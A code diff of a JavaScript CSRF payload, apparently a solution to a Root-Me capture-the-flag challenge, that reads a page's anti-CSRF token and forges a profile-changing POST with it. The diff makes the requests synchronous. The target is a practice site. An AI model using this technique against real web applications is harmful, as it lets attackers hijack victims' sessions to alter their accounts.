@@ -1,6 +1,6 @@
 var req = new XMLHttpRequest();
 req.onload = handleResponse;
-req.open('get','http://challenge01.root-me.org/web-client/ch23/index.php?action=profile',true);
+req.open('get','http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
 req.send();
 function handleResponse() {
     var tokena = this.responseText.match(/name="token" value="(\w+)"/)[1];
@@ -11,6 +11,6 @@ function handleResponse() {
     formData.append('token', tokena);
 
     var changeReq = new XMLHttpRequest();
-    changeReq.open('post', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', true);
+    changeReq.open('post', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
     changeReq.send(formData);
 };
